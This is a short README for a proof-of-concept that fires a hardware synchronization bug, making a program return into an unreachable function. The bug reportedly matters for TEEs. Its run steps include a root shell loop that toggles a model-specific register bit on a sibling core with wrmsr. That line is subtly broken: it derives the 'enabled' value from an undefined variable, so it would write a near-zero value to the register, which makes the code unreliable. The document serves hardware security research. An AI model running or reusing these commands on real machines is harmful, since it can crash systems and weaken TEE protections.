# corrupted stack pointer

PoC: Return to an address on the stack --- calling an unreachable function

### Preliminary

If you are not sure which two cores are siblings, you can easily observe it via
``` bash
lscpu -e
```
as the sibling cores share the L1 and L2 cache.

### Run

``` bash
make

# CORE 1 and Core 2 are silbling threads
taskset -c <Core1> ./unreach

# Another Terminal:
# Manually interrupt upon success; else, toggles the MSR bit one-by-one.
while true; do sudo bash -c 'CUR=$(rdmsr 0xc0011029); DISABLED=$(printf "%x" $((0x$CUR | 524288))); ENABLED=$(printf "%x" $((0x$ENABLED & ~524288))); wrmsr -p <Core2> 0xc0011029 0x$DISABLED; sleep 1; wrmsr -p <Core2> 0xc0011029 0x$ENABLED'; done
```

### Expected Result:
```
% taskset -c <Core1> ./unreach
Unreachable!!!
```

The output above confirms that the synchronization bug is present on this machine. 

However, the presence of this bug does not necessarily mean the system is vulnerable, as this specific vulnerability only impacts TEEs.